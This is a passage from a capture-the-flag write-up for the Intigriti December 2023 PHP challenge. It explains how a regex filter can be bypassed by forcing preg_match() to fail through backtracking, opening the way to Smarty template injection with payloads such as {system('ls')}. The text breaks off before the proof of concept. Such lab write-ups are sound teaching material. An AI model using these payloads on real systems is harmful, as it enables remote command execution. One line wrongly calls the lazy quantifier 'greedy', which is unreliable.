Mitigation</a></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#tldr>TL;DR</a></li><li><a href=#0-challenge-description>0. Challenge description</a></li><li><a href=#1-enumeration>1. Enumeration</a><ul><li><a href=#11-challenge-scenario>1.1) Challenge scenario</a></li><li><a href=#12-technologies>1.2) Technologies</a></li><li><a href=#13-source-code-analysis>1.3) Source code analysis</a></li></ul></li><li><a href=#14-regex-breakdown>1.4) Regex breakdown</a></li></ul><ul><li><a href=#21-filter-bypass-via-redos-that-causes-sigsegv-in-pcre>2.1) filter bypass via ReDoS that causes SIGSEGV in PCRE</a><ul><li><a href=#22-poc>2.2) PoC</a></li></ul></li><li><a href=#3-mitigation>3. Mitigation</a></li></ul></nav></div></details><script>var margin=200,marginError=50;(function(){var t=$(window),e=$("#TOCView"),s=e.height();function n(){var n=t.height()-margin;s>=n?(e.css("overflow-y","scroll"),e.css("max-height",n+marginError+"px")):(e.css("overflow-y","hidden"),e.css("max-height","9999999px"))}t.on("resize",n),$(document).ready(n)})(),function(){var t,e=$("#TableOfContents");if(e.length>0){t=$(window);function n(){var s,o=t.scrollTop(),i=$(".anchor"),n="";if(i.each(function(e,t){t=$(t),t.offset().top-$(window).height()/3<=o&&(n=decodeURIComponent(t.attr("id")))}),s=e.find("a.active"),s.length==1&&s.eq(0).attr("href")=="#"+n)return!0;s.each(function(e,t){$(t).removeClass("active")}),e.find('a[href="#'+n+'"]').addClass("active"),e.find('a[href="#'+n+'"]').parentsUntil("#TableOfContents").each(function(e,t){$(t).children("a").parents("ul").show()})}t.on("scroll",n),$(document).ready(function(){n()})}}()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><h1 class="relative group">Intigriti Monthly Challenge 1223<div id=intigriti-monthly-challenge-1223 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#intigriti-monthly-challenge-1223 aria-label=Anchor>#</a></span></h1><img src=./img/intigriti1223_banner.jpeg alt="Intigriti Monthly Challenge 1223" width=100%><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentcolor" d="M159.3 5.4c7.8-7.3 19.9-7.2 27.7.1 27.6 25.9 53.5 53.8 77.7 84 11-14.4 23.5-30.1 37-42.9 7.9-7.4 20.1-7.4 28 .1 34.6 33 63.9 76.6 84.5 118 20.3 40.8 33.8 82.5 33.8 111.9C448 404.2 348.2 512 224 512 98.4 512 0 404.1.0 276.5c0-38.4 17.8-85.3 45.4-131.7C73.3 97.7 112.7 48.6 159.3 5.4zM225.7 416c25.3.0 47.7-7 68.8-21 42.1-29.4 53.4-88.2 28.1-134.4-2.8-5.6-5.6-11.2-9.8-16.8l-50.6 58.8S180.8 199 175.1 192c-42 51.8-63.1 81.2-63.1 114.8C112 375.4 162.6 416 225.7 416z"/></svg>
</span></span><span class=dark:text-neutral-300><p><strong>Update</strong>:<br>This writeup was selected as the winner of the Intigriti December Challenge (1223) and was awarded a prize of 50€ on Intigriti swags &ndash;> <a href=https://x.com/intigriti/status/1737861726517784601 target=_blank>https://x.com/intigriti/status/1737861726517784601</a> .</p><p>At the moment of writing, this writeup it&rsquo;s also part of the HackTricks wiki on the &ldquo;PHP Tricks&rdquo; section &ndash;> <a href=https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#redos-bypass target=_blank>https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#redos-bypass</a></p></span></div><h2 class="relative group">TL;DR<div id=tldr class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#tldr aria-label=Anchor>#</a></span></h2><ul><li>The challenge involved achieving RCE through SSTI on PHP&rsquo;s Smarty template engine. This was accomplished by bypassing a filtering regex through backtracking, exceeding PHP&rsquo;s default <code>pcre.backtrack_limit</code>, ultimately leading to a Segmentation Fault. According to the <code>preg_match()</code> documentation, the function returns <code>false</code> on failure, which will successfully bypass the restrictions.</li></ul><h2 class="relative group">0. Challenge description<div id=0-challenge-description class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#0-challenge-description aria-label=Anchor>#</a></span></h2><blockquote><p>The solution&mldr;</p><ul><li>Should retrieve the flag from the web server.</li><li>The flag format is INTIGRITI{.*}.</li><li>Should NOT use another challenge on the intigriti.io domain.</li></ul></blockquote><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/yeshoneymeme.png alt></figure></p><h2 class="relative group">1. Enumeration<div id=1-enumeration class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#1-enumeration aria-label=Anchor>#</a></span></h2><h3 class="relative group">1.1) Challenge scenario<div id=11-challenge-scenario class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#11-challenge-scenario aria-label=Anchor>#</a></span></h3><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/firstlook.png alt="challenge first look"><figcaption>challenge first look</figcaption></figure></p><p>Let&rsquo;s go! Another Intigriti Challenge, time to get some coffe and win swa&mldr;oh&mldr;PHP&mldr;regex&mldr;</p><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/ahhh_cat.jpeg alt></figure></p><h3 class="relative group">1.2) Technologies<div id=12-technologies class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#12-technologies aria-label=Anchor>#</a></span></h3><p>One of the first things we look at are technologies; insidious CVEs and known bugs could give us an easy win.</p><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/wappalyzer.png alt=wappalyzer></figure></p><p>Unfortunately, not this time, since Wappalyzer tell us that PHP version is <code>7.4.33</code>, which is the latest for the <a href=https://www.php.net/ChangeLog-7.php target=_blank>PHP 7.x branch</a>. However, it&rsquo;s still PHP 7 and not 8, something to keep in mind.</p><p>As a second note of interest, the author of the challenge was kind enough to also give us the version used by Smarty - a well known template engine for PHP - which turns out to be <code>4.3.4</code>. Once again, this version is the <a href=https://github.com/smarty-php/smarty/releases target=_blank>latest release of the project</a> without known security bugs.</p><h3 class="relative group">1.3) Source code analysis<div id=13-source-code-analysis class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#13-source-code-analysis aria-label=Anchor>#</a></span></h3><p>As mentioned previously, we are kindly provided with the source code of the challenge, so let&rsquo;s take a look:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;source&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>require</span><span class=p>(</span><span class=s1>&#39;/var/www/vendor/smarty/smarty/libs/Smarty.class.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$smarty</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Smarty</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>setTemplateDir</span><span class=p>(</span><span class=s1>&#39;/tmp/smarty/templates&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>setCompileDir</span><span class=p>(</span><span class=s1>&#39;/tmp/smarty/templates_c&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>setCacheDir</span><span class=p>(</span><span class=s1>&#39;/tmp/smarty/cache&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>setConfigDir</span><span class=p>(</span><span class=s1>&#39;/tmp/smarty/configs&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$pattern</span> <span class=o>=</span> <span class=s1>&#39;/(\b)(on\S+)(\s*)=|javascript|&lt;(|\/|[^\/&gt;][^&gt;]+|\/[^&gt;][^&gt;]+)&gt;|({+.*}+)/s&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>assign</span><span class=p>(</span><span class=s1>&#39;pattern&#39;</span><span class=p>,</span> <span class=nv>$pattern</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>display</span><span class=p>(</span><span class=s1>&#39;index.tpl&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// returns true if data is malicious
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>check_data</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$pattern</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>preg_match</span><span class=p>(</span><span class=nv>$pattern</span><span class=p>,</span><span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>check_data</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>assign</span><span class=p>(</span><span class=s1>&#39;pattern&#39;</span><span class=p>,</span> <span class=nv>$pattern</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>assign</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;Malicious Inputs Detected&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>display</span><span class=p>(</span><span class=s1>&#39;index.tpl&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$tmpfname</span> <span class=o>=</span> <span class=nx>tempnam</span><span class=p>(</span><span class=s2>&#34;/tmp/smarty/templates&#34;</span><span class=p>,</span> <span class=s2>&#34;FOO&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$handle</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=nv>$tmpfname</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>fwrite</span><span class=p>(</span><span class=nv>$handle</span><span class=p>,</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$handle</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$just_file</span> <span class=o>=</span> <span class=nx>end</span><span class=p>(</span><span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span><span class=nv>$tmpfname</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>display</span><span class=p>(</span><span class=nv>$just_file</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>unlink</span><span class=p>(</span><span class=nv>$tmpfname</span><span class=p>);</span>
</span></span></code></pre></div><p>What&rsquo;s happening here?<br>First of all, if we don&rsquo;t provide the <code>data</code> parameter to the POST request, it simply render the same page again.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>assign</span><span class=p>(</span><span class=s1>&#39;pattern&#39;</span><span class=p>,</span> <span class=nv>$pattern</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>display</span><span class=p>(</span><span class=s1>&#39;index.tpl&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Then, our input <code>$_POST['data']</code> undergoes a check by a regular expression in the <code>check_data()</code> function that use the <code>preg_match()</code> function of the PHP PCRE library.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>check_data</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$pattern</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>preg_match</span><span class=p>(</span><span class=nv>$pattern</span><span class=p>,</span><span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>If the regex identifies a match, the server responds with &ldquo;Malicious input detected&rdquo; (AKA you won&rsquo;t get the flag :P).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>check_data</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>assign</span><span class=p>(</span><span class=s1>&#39;pattern&#39;</span><span class=p>,</span> <span class=nv>$pattern</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>assign</span><span class=p>(</span><span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;Malicious Inputs Detected&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>display</span><span class=p>(</span><span class=s1>&#39;index.tpl&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Otherwise, our input is written into a temporary file (with a randomly generated name)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$tmpfname</span> <span class=o>=</span> <span class=nx>tempnam</span><span class=p>(</span><span class=s2>&#34;/tmp/smarty/templates&#34;</span><span class=p>,</span> <span class=s2>&#34;FOO&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$handle</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=nv>$tmpfname</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>fwrite</span><span class=p>(</span><span class=nv>$handle</span><span class=p>,</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>fclose</span><span class=p>(</span><span class=nv>$handle</span><span class=p>);</span>
</span></span></code></pre></div><p>and this file is passed to the Smarty <code>display()</code> function. This function essentially processes the template and outputs it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$just_file</span> <span class=o>=</span> <span class=nx>end</span><span class=p>(</span><span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span><span class=nv>$tmpfname</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$smarty</span><span class=o>-&gt;</span><span class=na>display</span><span class=p>(</span><span class=nv>$just_file</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>unlink</span><span class=p>(</span><span class=nv>$tmpfname</span><span class=p>);</span>
</span></span></code></pre></div><p>Thus, our objective is probably to exploit SSTI, Server-Side Template Injection: a vulnerability that arises when an arbitrary user input with the native template syntax (like the example below), is fed into the template engine (Smarty in our case) and gets executed server-side.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=p>{</span><span class=nx>system</span><span class=p>(</span><span class=s1>&#39;ls&#39;</span><span class=p>)}</span> <span class=c1>// the ls command gets executed!
</span></span></span></code></pre></div><p>It&rsquo;s evident that if we manage to evade the regex and allow curly brackets to be included in the temporary file, we achieve Remote Command Execution (RCE).</p><h2 class="relative group">1.4) Regex breakdown<div id=14-regex-breakdown class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#14-regex-breakdown aria-label=Anchor>#</a></span></h2><p>Now let&rsquo;s take a look at the regex in detail.</p><pre tabindex=0><code class=language-regex data-lang=regex>/(\b)(on\S+)(\s*)=|javascript|&lt;(|\/|[^\/&gt;][^&gt;]+|\/[^&gt;][^&gt;]+)&gt;|({+.*}+)/s
</code></pre><ol><li><p>Attribute Event Handlers:</p><ul><li><code>(\b)(on\S+)(\s*)=</code>: This part is designed to identify potential event handlers in HTML attributes that start with &ldquo;on&rdquo; (e.g., onclick, onmouseover).<ul><li><code>(\b)</code>: Word boundary to ensure that &ldquo;on&rdquo; is the beginning of a word.</li><li><code>(on\S+)</code>: Matches &ldquo;on&rdquo; followed by one or more non-whitespace characters.</li><li><code>(\s*)</code>: Matches any whitespace characters following the event handler.</li><li><code>=</code>: Looks for the equal sign indicating the start of an attribute value.</li></ul></li></ul></li><li><p>Javascript String:</p><ul><li><code>javascript</code>: This part simply looks for the string &ldquo;javascript,&rdquo; which could indicate an attempt to execute JavaScript code.</li></ul></li><li><p>HTML Tags:</p><ul><li><code>&lt;(|\/|[^\/>][^>]+|\/[^>][^>]+)></code>: This section attempts to match HTML tags.<ul><li><code>&lt;</code>: Matches the opening bracket of an HTML tag.</li><li><code>(|\/|[^\/>][^>]+|\/[^>][^>]+)</code>: This part is more complex:<ul><li><code>\/</code>: Matches a forward slash, possibly indicating a self-closing tag.<br>OR (<code>|</code>)</li><li><code>[^\/>][^>]+</code>: Matches characters that are not a forward slash or a closing bracket, ensuring that the tag has some content.<br>OR (<code>|</code>)</li><li><code>\/[^>][^>]+</code>: Matches a forward slash followed by characters, ensuring the tag has some content.</li></ul></li><li><code>></code>: Matches the closing bracket of an HTML tag.</li></ul></li></ul></li><li><p>Curly Braces Content:</p><ul><li><code>({+.*}+)</code>: This part attempts to match content enclosed in curly braces. Breaking it down:<ul><li><code>{+</code>: Matches one or more opening curly braces.</li><li><code>.*</code>: Matches any characters (zero or more).</li><li><code>}+</code>: Matches one or more closing curly braces.</li></ul></li></ul></li></ol><hr><h1 class="relative group">2. Exploitation<div id=2-exploitation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#2-exploitation aria-label=Anchor>#</a></span></h1><p>I was searching far and wide for an attack vector, staring at the regex on <a href=https://regex101.com/ target=_blank>regex101</a> trying to find some flaws where I could throw my <code>{ }</code> to get SSTI&mldr;<br>Until I realized that I probably shouldn&rsquo;t focus on the regex <strong>ITSELF</strong> but more on the context in which it was used.</p><p>Knowing the beautiful pearls of wisdom that PHP gifts us, I started looking for the usual evasion techniques:</p><ul><li><em>Type Juggling</em></li><li><em>Null Byte Injection</em> (something that would have worked <a href="https://bugs.php.net/bug.php?id=44366" target=_blank>back in 2008</a> lol)</li><li>or even leaving <code>&lt;?php</code> tag open and letting the server fix it (taking inspiration from mutation XSS).
However, none of these approaches were allowing me to win.</li></ul><p>Actually, for the last idea, it would only work if the application saved our files with the <code>.php</code> extension and not just a random name as a result of <code>tempnam()</code>.<br>Indeed, observe how the <em>same file with an unclosed PHP tag inside</em> will be interpreted differently by the server with the extension as the only difference:</p><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/gatotest.png alt="Rendering of file with <?php tag open WITHOUT .php extension VS WITH .php extension"><figcaption>Rendering of file with <code>&lt;?php</code> tag open WITHOUT <code>.php</code> extension VS WITH <code>.php</code> extension</figcaption></figure></p><p>But that was not the case.<br>Anyway, I began looking into various documentations, starting with the Smarty documentation and then referring to the PHP documentation for information about the various functions used in the code. Usually, you can find warnings about how specific functions should be implemented, and, in fact, reading the <a href=https://www.php.net/manual/en/function.preg-match.php target=_blank>PHP documentation of <code>preg_match()</code></a>, I came across this one:</p><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/preg_match_warning.png alt="preg_match() Documentation warning&mldr;PHP&mldr;why????"><figcaption>preg_match() Documentation warning&mldr;PHP&mldr;why????</figcaption></figure></p><p>Ummmmhh, can this be useful to us somehow?<br>Certainly! Take another look at the code where <code>preg_match()</code> is involved:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>// returns true if data is malicious
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>check_data</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$pattern</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>preg_match</span><span class=p>(</span><span class=nv>$pattern</span><span class=p>,</span><span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Yea, the comments says it returns <code>true</code> if the pattern matches our input, but in reality, it returns <code>1</code> if it matches, <code>0</code> if it does not match, and <em><strong>it returns <code>false</code> if the regex fails</strong></em>!<br>Then the return value is used as condition in a <code>if</code> statement without strict type checks! (classic PHP oversights)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>check_data</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=o>...</span><span class=p>]</span> <span class=c1>// we are bad people 
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Let&rsquo;s quickly test in the PHP console what happens when the return value of the <code>check_data()</code> function is <code>1</code>, <code>0</code> or <code>false</code>:</p><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/consoletest.png alt></figure></p><p>We may have found the path.</p><h2 class="relative group">2.1) filter bypass via ReDoS that causes SIGSEGV in PCRE<div id=21-filter-bypass-via-redos-that-causes-sigsegv-in-pcre class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#21-filter-bypass-via-redos-that-causes-sigsegv-in-pcre aria-label=Anchor>#</a></span></h2><p>Now the question is:</p><blockquote><p>How can we cause the <code>preg_match()</code> to fail?</p></blockquote><p>Luckily for me, lately I had to deal with challenges where a &ldquo;ReDoS&rdquo; made a Race Condition possible, I have also recently started a project where I had to deal a lot with regexes and therefore I also had to fight with the regex backtracking nightmare.<br>So I know how to make a regex do bad things. And knowing what a &ldquo;ReDoS&rdquo; is, helped me to find what i was searching for.</p><p>However, in the context of this challenge I still didn&rsquo;t know what the conditions were for causing unexpected behaviors. I just knew I had somehow to blow things up.</p><p>So, I thought Google might have something exotic to offer me. Searching for &ldquo;<em>php preg_match ReDoS</em>&rdquo; or &ldquo;<em>php regex failure</em>,&rdquo; you can find some interesting articles:</p><ul><li><a href=https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS target=_blank>OWASP ReDoS</a></li><li><a href=https://www.rexegg.com/regex-explosive-quantifiers.html target=_blank>The Explosive Quantifier Trap</a></li><li><a href=https://blog.doyensec.com/2021/03/11/regexploit.html target=_blank>Regexploit: DoS-able Regular Expressions</a></li><li><a href=http://www.rafaybaloch.com/2017/06/bad-meets-evil-php-meets-regular.html target=_blank>Bad Meets evil - PHP meets Regular Expressions</a></li><li><a href=https://jesperjarlskov.dk/php-regular-expression-functions-causing-segmentation-fault target=_blank>PHP regular expression functions causing segmentation fault</a></li></ul><p>Everything lead to one path, specially the latest two blogs.</p><blockquote><p>In short the problem happens because the <code>preg_*</code> functions in PHP builds upon the <a href=http://www.pcre.org/ target=_blank>PCRE library</a>. In PCRE certain regular expressions are matched by using a lot of recursive calls, which uses up a lot of stack space. It is possible to set a limit on the amount of recursions allowed, but in PHP this limit <a href=http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit target=_blank>defaults to 100.000</a> which is more than fits in the stack.</p></blockquote><p><a href=http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error target=_blank>This Stackoverflow thread</a> was also linked in the post where it is talked more in depth about this issue.
Our task was now clear:<br><strong>Send an input that would make the regex do 100_000+ recursions, causing SIGSEGV, making the <code>preg_match()</code> function return <code>false</code> thus making the application think that our input is not malicious, throwing the surprise at the end of the payload something like <code>{system(&lt;verybadcommand>)}</code> to get SSTI &ndash;> RCE &ndash;> flag :)</strong>.</p><p>I had two options to get there:</p><ol><li>Send a load of shit and pray.</li><li>Reflect on which points the regex was backtracking the most and give calculated weight to those weak points.</li></ol><p>Since I didn&rsquo;t want to destroy the challenge&rsquo;s infrastructure, I opted for the latter.</p><p>First of all, we need to put pressure on the Explosive Quantifier <code>*</code> that we can find in the first part of the regex:</p><pre tabindex=0><code class=language-regex data-lang=regex>(\b)(on\S+)(\s*)=
</code></pre><p>Let&rsquo;s start by matching the word boundary (<code>\b</code>) , meaning that the matching group that comes after will be captured as a whole word.<br>Then we need to match the &ldquo;on&rdquo; and we&rsquo;re ready to give our Christmas gift of &ldquo;X&rdquo; characters to the quantifier explosive &ldquo;*&rdquo;, which will match all the &ldquo;X&rdquo; characters, moving the pointer forward by <code>n</code> positions where <code>n</code> is the number of our &ldquo;X&rdquo; characters.<br>This is the opposite of what would have happened with the &ldquo;greedy&rdquo; quantifier ( <code>*?</code>), which would have halved the number of iterations.
